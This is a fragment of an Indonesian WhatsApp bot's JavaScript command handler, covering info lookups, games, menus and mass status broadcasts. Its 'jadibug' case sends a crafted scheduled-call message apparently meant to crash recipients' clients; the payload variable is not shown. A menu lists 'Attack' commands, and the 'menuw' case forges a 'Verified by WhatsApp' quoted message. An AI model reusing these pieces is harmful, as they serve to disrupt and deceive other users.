var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
var caption = `Lokasi : ${data.result.lokasi}\n`
caption += `Waktu : ${data.result.waktu}\n`
caption += `Potensi : ${data.result.potensi}\n`
caption += `Magnitude : ${data.result.magnitude}\n`
caption += `Kedalaman : ${data.result.kedalaman}\n`
caption += `Koordinat : ${data.result.koordinat}`
conn.sendMessage(from, { image: { url: data.result.map }, caption })
break
//=================================================
case 'lirik':
if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${apikey}&query=${command}`)
reply(data.result)
break
//=================================================//
case 'jadwaltv':
if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apikey}`)
var txtayaj = `Jadwal TV ${args[0].toUpperCase()}\n`
for (var x in data.result) {
txtayaj += `${x} - ${data.result[x]}\n`
}
reply(txtayaj)
break
//=================================================
case 'jadwaltvnow':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
var txtayajas = `Jadwal TV Now :\n`
for (var x in data.result) {
txtayajas += `${x.toUpperCase()}${data.result[x]}\n\n`
}
reply(txtayajas)
break
//=================================================
case 'cerpen':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
//=================================================
case 'ceritahoror':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
conn.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
break
//=================================================
case 'cuaca':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
var textppp = `Tempat : ${data.result.tempat}\n`
textppp += `Cuaca : ${data.result.cuaca}\n`
textppp += `Angin : ${data.result.angin}\n`
textppp += `Description : ${data.result.description}\n`
textppp += `Kelembapan : ${data.result.kelembapan}\n`
textppp += `Suhu : ${data.result.suhu}\n`
textppp += `Udara : ${data.result.udara}\n`
textppp += `Permukaan laut : ${data.result.permukaan_laut}\n`
conn.sendMessage(from, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
reply(textppp)
break
//=================================================
case 'afk': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`😓 yahh, kak *${pushname}*... Telah Afk\n\n*❏ Alasan* ${text ? ': ' + text : ''}`)
}
break
//=================================================
case 'buatsw':{
if (!isCreator) return m.reply('*Khusus Premium*')
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) return m.reply('reply pesan')
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = conn.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = conn.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
await loading ()
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case "buatswimage":{
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
 if (!quoted) return m.reply(`Balas image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Balas image dengan caption *${prefix + command}*`)
const media = await conn.downloadAndSaveMediaMessage(quoted)
conn.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: pengguna})
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case "buatswvideo":{
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
 if (!quoted) return m.reply(`Balas video Dengan Caption ${prefix + command}`)
if (!/video/.test(mime)) return m.reply(`Balas video dengan caption *${prefix + command}*`)
const media = await conn.downloadAndSaveMediaMessage(quoted)
conn.sendMessage('status@broadcast', { video: { url: media }}, {statusJidList: pengguna})
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'swin':{
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
if (!text) return m.reply(`masukin text nya`)
conn.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'vnsw':{
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
if (!text) return m.reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
conn.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'inisw':{
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
if (!text) return m.reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
conn.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://instagram.com/',
title: ownername,
sourceUrl: `https://instagram.com/`, 
thumbnail: add}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'hapusdb':
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62345678910@s.whatsapp.net`)
yakiii = text.split("|")[0].replace(/[^0-9]/g, '')
unnnp = pengguna.indexOf(yakiii)
pengguna.splice(unnnp, 1)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
m.reply(`Nomor ${yakiii} Telah Di Hapus Dari Database!!!`)
break
//=================================================//
case 'listdb':
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
if (isBan) return m.reply('*Lu Di Ban Owner*')
 teksoooo = '*List Database*\n\n'
for (let i of pengguna) {
teksoooo += `- ${i}\n`
}
teksoooo += `\n*Total : ${pengguna.length}*`
conn.sendMessage(from, { text: teksoooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": pengguna } })
break
//=================================================
case "buatswptv":
{
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
 if (!m.quoted) return m.reply(`Balas Video Dengan Caption ${prefix + command}`)
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
conn.relayMessage('status@broadcast', ptv.message, {
statusJidList: pengguna
})
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'toptv':
{
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
 if (!m.quoted) return m.reply(`Balas Video Dengan Caption ${prefix + command}`)
  if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
conn.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
//=================================================
case "buatsws":{
if (!isCreator) return m.reply('*Khusus Premium*')
await loading ()
 if (!quoted) return m.reply(`Balas Sticker Dengan Caption ${prefix + command}`)
if (!/webp/.test(mime)) return m.reply(`Balas sticker dengan caption *${prefix + command}*`)
const media = await conn.downloadAndSaveMediaMessage(quoted)
conn.sendMessage('status@broadcast', { sticker: { url: media }}, {statusJidList: pengguna})
}
m.reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
//=================================================
case 'family100': {
 if ('family100'+from in _family100) {
 m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await conn.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,
 }
}
break
//=================================================//
case 'tebak': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`)
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return m.reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await JSON.parse(fs.readFileSync('./database/Games/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await conn.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 conn.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c31ea54c441377970d979.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return m.reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c31ea54c441377970d979.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return m.reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c31ea54c441377970d979.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return m.reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c31ea54c441377970d979.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return m.reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c31ea54c441377970d979.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return m.reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(30000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c31ea54c441377970d979.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
//=================================================//
case 'kuismath': case 'math': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return m.reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let { genMath, modes } = require('./src/math')
 if (!text) return m.reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
 let result = await genMath(text.toLowerCase())
 conn.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply('Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) return m.reply(`Kamu sedang tidak berada di room tictactoe !`)
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return m.reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await conn.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) conn.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
//=================================================
case 'jadibug': {
if (!isCreator) return m.reply('*khusus Premium*')
if (!text) return m.reply(`Contoh : ${prefix + command} halo guys`)
let teks = `${text}`
{
const cap = `${teks} ${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
}
break
 //=================================================
case  'qcimg':{
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await conn.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await conn.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
conn.sendMessage(from,{image: buffer},{quoted : kr})
})
}
break
//=================================================//
/*case  'qc':{
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await conn.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await conn.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)
const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await conn.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break*/
//=================================================
case 'delete':{
conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break
        case "menux":
        let riski = `Hai ${pushname} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
</>  I N F O - B O T </>
───────────────────────
  ◦ ⛩️ Bot Name : ${global.botname}
  ◦ ⛩️ Version : 
  ◦ ⛩️ Baileys : 
  ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
</>  M E N U - B O T </>
───────────────────────
_*Owner Menu*_
 ゲ ◦ ${prefix}upsw
 ゲ ◦ ${prefix}bot
 ゲ ◦ ${prefix}getpp
 ゲ ◦ ${prefix}getsw
 ゲ ◦ ${prefix}addcase
 ゲ ◦ ${prefix}dellcase
 ゲ ◦ ${prefix}getcase
 ゲ ◦ $
 ゲ ◦ =>
 ゲ ◦ >

_*Attack Menu*_
 ゲ ◦ ${prefix}temp-ban
 ゲ ◦ ${prefix}brow
 ゲ ◦ ${prefix}mix
 ゲ ◦ ${prefix}lol

_*Sticker Menu*_
 ゲ ◦ ${prefix}sticker
 ゲ ◦ ${prefix}cls
 ゲ ◦ ${prefix}smeme 
 ゲ ◦ ${prefix}qc
 ゲ ◦ ${prefix}dino
 ゲ ◦ ${prefix}kuromi
 ゲ ◦ ${prefix}pucoyo
 ゲ ◦ ${prefix}ekuning

_*Tools Menu*_
 ゲ ◦ ${prefix}remini
 ゲ ◦ ${prefix}tts
 ゲ ◦ ${prefix}readvo
 ゲ ◦ ${prefix}tr
 ゲ ◦ ${prefix}jarak
 ゲ ◦ ${prefix}kalkulator
 ゲ ◦ ${prefix}get
 ゲ ◦ ${prefix}getweb
 ゲ ◦ ${prefix}shortlink
 ゲ ◦ ${prefix}tomp3

_*Ai Menu*_
 ゲ ◦ ${prefix}naw
 ゲ ◦ ${prefix}bingimg-2d
 ゲ ◦ ${prefix}gemini
 ゲ ◦ ${prefix}gemini-img
 ゲ ◦ ${prefix}sindy
 ゲ ◦ ${prefix}openai

_*Main Menu*_
 ゲ ◦ ${prefix}disk
 ゲ ◦ ${prefix}ping
 ゲ ◦ ${prefix}play
 ゲ ◦ ${prefix}playmusic
 ゲ ◦ ${prefix}whatmusic
 ゲ ◦ ${prefix}song

_*Voice Menu*_
 ゲ ◦ ${prefix}bass
 ゲ ◦ ${prefix}blown
 ゲ ◦ ${prefix}deep
 ゲ ◦ ${prefix}earrape
 ゲ ◦ ${prefix}fast
 ゲ ◦ ${prefix}fat
 ゲ ◦ ${prefix}nightcore
 ゲ ◦ ${prefix}reverse
 ゲ ◦ ${prefix}robot
 ゲ ◦ ${prefix}slow
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}tupai
 ゲ ◦ ${prefix}smooth
 ゲ ◦ ${prefix}speech

_*Group Menu*_
 ゲ ◦ ${prefix}add
 ゲ ◦ ${prefix}kick
 ゲ ◦ ${prefix}promote
 ゲ ◦ ${prefix}demote
 ゲ ◦ ${prefix}totag
 ゲ ◦ ${prefix}tagall
 ゲ ◦ ${prefix}closetime
 ゲ ◦ ${prefix}opentime
 
───────────────────────
${global.botname}
───────────────────────`
        m.reply(riski)
        break
        case "menuq":
        let ewe = `Hello ${pushname}


*Download Menu*
- .aio
- .gitclone
- .instagram
- .tiktok


*Convert Menu*
- .sticker
- .toimage


*Group Menu*
- .add
- .afk
- .aproveall
- .afk
- .hidetag
- .kick
- .linkgc
- .reject


*Informasi Menu*
- .owner
- .runtime
- .ping
- .statserver
- .totalfitur


*Main Menu*
- .menu
- .tqto


*Owner Menu*
- .addowner
- .backup
- .banchat
- .broadcast
- .clearsesi
- .delplugin
- .delowner
- .getplugins
- .setplugin
- .setppbot
- .banchat


*Tools Menu*
- .gempa
- .get
- .goole
- .inspect
- .lyrics
- .rvo
- .servermc
- .ssweb
- .goolee`

        break
        
case 'menuw':
        //if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
        let asu = `
╭✄┈┈┈⟬ *INFO-BOT* ⟭
┆❐ Creator : ${ownername}
┆❐ Bot Name : ᴄʏʏxᴇʀᴏ ᴀɪ
┆❐ Time : ${time}
┆❐ Date : ${hariini}
┆❐ Mode : ${conn.mode ? "self" : "public"}
╰──────────◇


┏━━━✦❘ *MAIN* ❘
┆❐ .help
┆❐ .menu
┆❐ .ping
┆❐ .botstatus
┆❐ .owner
┆❐ .sc
┆❐ .gpt4
┗━━━━━━━━━━┛
┏━━━✦❘ *DOWNLOADER* ❘
┆❐ .play
┆❐ .ytmp4 
┆❐ .ytmp3
┆❐ .tiktok
┆❐ .ig
┆❐ .spotify 
┗━━━━━━━━━━━━━━━┛
┏━━━✦❘ *OWNER* ❘
┆❐ .public
┆❐ .self
┗━━━━━━━━━━┛`
        let Dich = `${global.Dich}`
            conn.sendMessage(m.chat, {
            document: fs.readFileSync("./package.json"),
            fileName: `𝗖𝘆𝘆𝘅𝗲𝗿𝗼 𝗔𝘀𝗶𝘀𝘀𝘁𝗲𝗻`,
            fileLength: new Date(),
            pageCount: "2024",
            caption: Dich,
            mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            ThumbnailUrl: 'https://telegra.ph/file/bd1696af2ff806ad5f06a.jpg',
      contextInfo: {
      externalAdReply: {
      title: `𝗖𝗼𝗽𝘆𝗿𝗶𝗴𝗵𝘁 𝟮𝟬𝟮𝟰 - 𝗖𝘆𝘆𝘅𝗲𝗿𝗼`,
      body: `Time: ${time}`,
      thumbnailUrl: 'https://telegra.ph/file/081fc5dd14146b0555de2.jpg',//https://telegra.ph/file/bd1696af2ff806ad5f06a.jpg
      sourceUrl: null,
      mediaType: 1,
      renderLargerThumbnail: true, 
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: `6285224079032@s.whatsapp.net`
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: newslttr,
            serverMessageId: 1,
            newsletterName: `🛑 Aktif: ${runtime(process.uptime())} || ${global.botname}`
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: '🐳 Cyxero Terverifikasi Oleh WhatsApp' }}});
             
        break
        
        case 'addowner':
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await conn.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Number ${bnnd} Has Become An Owner!!!`)
break
        case 'delowner':
if (!isCreator) return reply(mess.onwer)
